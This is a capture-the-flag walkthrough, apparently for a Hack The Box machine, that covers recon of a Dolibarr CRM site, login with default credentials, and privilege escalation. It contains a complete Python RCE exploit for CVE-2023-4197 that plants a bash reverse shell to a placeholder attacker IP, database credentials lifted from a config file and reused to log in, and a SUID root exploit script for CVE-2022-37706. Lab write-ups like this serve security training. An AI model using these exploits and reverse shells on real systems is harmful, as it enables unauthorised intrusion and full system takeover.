# 0x1 Initial Reconnaissance

Start by scanning the machine with `nmap`:

```
nmap -sV -p- 10.129.35.16
```

Nmap Results:

```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
```

From the `nmap` scan, we know that SSH and HTTP services are running. The web service on port 80 is usually a good starting point.

# 0x2 port 80

Visit the website on `http://10.129.35.16` and analyze its content. Use `ffuf` to find subdomains:

```
ffuf -u "http://10.129.35.16" -H "Host: FUZZ.board.htb" -w /path/to/wordlist.txt
```

FFUF Results:

```
[Status: 200, Size: 6360, Words: 397, Lines: 150, Duration: 205ms]
* FUZZ: crm
```

The subdomain `crm.board.htb` was discovered, and it appears to be running Dolibarr.

# 0x3 Exploiting Dolibarr

Attempt to log in with default credentials `admin:admin`, which is successful.

Next, search for vulnerabilities specific to Dolibarr 17.0.0. A suitable exploit is found that allows Remote Code Execution (RCE): https://starlabs.sg/advisories/23/23-4197/

```
python3 exp.py http://crm.board.htb/ admin admin whoami
```

Initially, this did not work. Modify the payload in the script to use PHP tags:

```
<?php echo system('whoami'); ?>
```

Run the exploit again:

```
python3 exp.py http://crm.board.htb/ admin admin whoami
```

This time, it succeeds, and the output confirms RCE.

# 0x4 Gaining a Shell

With RCE, spawn a reverse shell. Upload a PHP reverse shell script or use the existing RCE to get a reverse shell:

```
<?php system('bash -c "bash -i >& /dev/tcp/YOUR_IP/4444 0>&1"'); ?>
```

Modify the exploit script:

```
# Dolibarr ERP CRM (v18.0.1) Improper Input Sanitization Vulnerability (CVE-2023-4197)
# Via: https://TARGET_HOST/website/index.php
# Author: Poh Jia Hao (STAR Labs SG Pte. Ltd.)

#!/usr/bin/env python3
import os
import re
import requests
import sys
import uuid
requests.packages.urllib3.disable_warnings()

s = requests.Session()

def check_args():
    global target, username, password, cmd

    print("\n===== Dolibarr ERP CRM (v18.0.1) Improper Input Sanitization Vulnerability (CVE-2023-4197) =====\n")

    if len(sys.argv) != 5:
        print("[!] Please enter the required arguments like so: python3 {} https://TARGET_URL USERNAME PASSWORD CMD_TO_EXECUTE".format(sys.argv[0]))
        sys.exit(1)

    target = sys.argv[1].strip("/")
    username = sys.argv[2]
    password = sys.argv[3]
    cmd = sys.argv[4]

def authenticate():
    global s, csrf_token

    print("[+] Attempting to authenticate...")

    # GET the CSRF token
    res = s.get(f"{target}/", verify=False)
    csrf_token = re.search("\"anti-csrf-newtoken\" content=\"(.+)\"", res.text).group(1).strip()

    # Login
    data = {
        "token": csrf_token,
        "username": username,
        "password": password,
        "actionlogin": "login"
    }
    res = s.post(f"{target}/", data=data, verify=False)

    if "Logout" not in res.text:
        print("[!] Authentication failed! Are the credentials valid?")
        sys.exit(1)
    else:
        print("[+] Authenticated successfully!")

def rce():
    # Create web site
    print("[+] Attempting to create a website...")
    website_name = uuid.uuid4().hex
    data = {
        "WEBSITE_REF": website_name,
        "token": csrf_token,
        "action": "addsite",
        "WEBSITE_LANG": "en",
        "addcontainer": "create"
    }
    res = s.post(f"{target}/website/index.php", data=data, verify=False)
    if f"Website - {website_name}" not in res.text:
        print("[!] Website creation failed!")
        sys.exit(1)
    else:
        print(f"[+] Created website name: \"{website_name}\"!")

    # Create web page
    print("[+] Attempting to create a web page...")
    webpage_name = uuid.uuid4().hex
    data = {
        "website": website_name,
        "token": csrf_token,
        "action": "addcontainer",
        "WEBSITE_TYPE_CONTAINER": "page",
        "WEBSITE_TITLE": "x",
        "WEBSITE_PAGENAME": webpage_name
    }
    res = s.post(f"{target}/website/index.php", data=data, verify=False)
    if f"Contenair \\'{webpage_name}\\' added" not in res.text:
        print("[!] Web page creation failed!")
        sys.exit(1)
    else:
        print(f"[+] Created web page name: \"{webpage_name}\"!")

    # Modify created page
    print("[+] Attempting to modify the web page...")
    webpage_id = re.search(f"<option value=\"(.+)\" .+{webpage_name}", res.text).group(1).strip()
    data = {
        "website": website_name,
        "WEBSITE_PAGENAME": webpage_name,
        "pageid": webpage_id,
        "token": csrf_token,
        "action": "updatemeta",
        "htmlheader": f"<?PHP system('bash -c \"bash -i >& /dev/tcp/IP/4444 0>&1\"'); ?>"
    }
    res = s.post(f"{target}/website/index.php", data=data, verify=False)
    if "Saved" not in res.text:
        print("[!] Web page modification failed!")
        sys.exit(1)
    else:
        print("[+] Web page modified successfully!")

    # Trigger RCE
    print(f"[+] Triggering RCE now via: {target}/public/website/index.php?website={website_name}&pageref={webpage_name}")
    res = s.get(f"{target}/public/website/index.php?website={website_name}&pageref={webpage_name}", verify=False)
    if res.status_code != 200:
        print("[!] Web page is not reachable!")
        sys.exit(1)
    else:
        output = re.findall("block -->\n(.+)</head>", res.text, re.MULTILINE | re.DOTALL)[0].strip()
        print(f"[+] RCE successful! Output of command:\n\n{output}")

def main():
    check_args()
    authenticate()
    rce()

if __name__ == "__main__":
    main()
```

Set up a listener on your machine:

```
nc -lvnp 4444
```

Trigger the payload to get a shell as `www-data`.

# 0x5 Privilege Escalation

Look for sensitive files and configuration details:

```
find /var/www/html/crm.board.htb/ -name "conf.php"
```

Config File:

```
$dolibarr_main_db_pass='serverfun2$2023!!';
```

Switch to the user `larissa` using the credentials found in the configuration file:

```
su larissa
Password: serverfun2$2023!!
```

OR

Get a stable shell using SSH

```
ssh larissa@board.htb
```

Get `user.txt`

# 0x6 Root Privilege Escalation

Use `linpeas.sh` to find `SUID` binaries that could be exploited. One of the binaries `/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys` is vulnerable.

Exploit it using the modified script from Exploit-DB:

```
#!/usr/bin/bash

echo "CVE-2022-37706"
echo "[*] Trying to find the vulnerable SUID file..."
file="/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys"

mkdir -p /tmp/net
mkdir -p "/dev/../tmp/;/tmp/exploit"

echo "/bin/sh" > /tmp/exploit
chmod a+x /tmp/exploit

${file} /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), "/dev/../tmp/;/tmp/exploit" /tmp///net
```

Run the exploit:

```
bash root.sh
```

Get `root.txt`